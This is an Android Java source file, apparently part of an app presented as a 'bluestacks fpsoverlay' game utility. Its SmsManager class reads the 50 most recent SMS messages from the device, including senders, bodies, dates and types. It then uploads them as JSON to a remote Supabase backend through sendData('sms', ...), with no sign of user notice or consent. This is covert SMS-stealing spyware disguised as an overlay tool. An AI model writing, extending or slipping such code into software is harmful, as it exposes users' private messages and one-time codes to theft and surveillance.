package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import com.google.gson.Gson;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsManager {
    private static final String TAG = "SmsManager";
    private final Context context;
    private final SupabaseManager supabaseManager;

    public SmsManager(Context context, SupabaseManager supabaseManager) {
        this.context = context;
        this.supabaseManager = supabaseManager;
    }

    public void sendSmsList() {
        try {
            Log.d(TAG, "Attempting to fetch SMS list...");
            Uri uri = Uri.parse("content://sms/");
            Cursor c = context.getContentResolver().query(uri, null, null, null, "date DESC");
            List<Map<String, String>> list = new ArrayList<>();
            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < 50) {
                    Map<String, String> m = new HashMap<>();
                    try {
                        m.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                        m.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                        m.put("date", c.getString(c.getColumnIndexOrThrow("date")));
                        m.put("type", c.getString(c.getColumnIndexOrThrow("type")));
                        list.add(m);
                        count++;
                    } catch (Exception e) {
                        Log.e(TAG, "Error reading SMS row: " + e.getMessage());
                    }
                }
                c.close();
            }
            Log.d(TAG, "Fetched " + list.size() + " SMS. Sending to Supabase.");
            supabaseManager.sendData("sms", new Gson().toJson(list));
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch SMS: " + e.getMessage());
        }
    }
}
